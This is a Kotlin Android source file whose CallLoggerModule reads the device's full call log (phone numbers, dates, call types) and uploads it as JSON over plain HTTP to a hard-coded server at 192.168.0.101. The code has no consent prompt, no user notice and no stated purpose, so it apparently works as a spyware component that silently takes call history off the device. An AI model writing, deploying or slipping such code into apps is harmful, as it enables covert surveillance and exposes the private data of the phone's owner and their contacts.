package com.example.calllogger

import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class CallLoggerModule {
    fun collectAndSendCallLogs(context: Context) {
        val callLogs = JSONArray()

        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE),
            null, null, CallLog.Calls.DATE + " DESC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(0)
                val date = it.getString(1)
                val type = it.getInt(2)

                val call = JSONObject().apply {
                    put("number", number)
                    put("date", date)
                    put("type", when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "unknown"
                    })
                }
                callLogs.put(call)
            }
        }

        sendToServer(callLogs)
    }

    private fun sendToServer(data: JSONArray) {
        try {
            val url = URL("http://192.168.0.101:3000/upload-calls")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val writer = OutputStreamWriter(conn.outputStream)
            writer.write(data.toString())
            writer.flush()
            writer.close()

            val responseCode = conn.responseCode
            println("Server response: $responseCode")
            conn.disconnect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
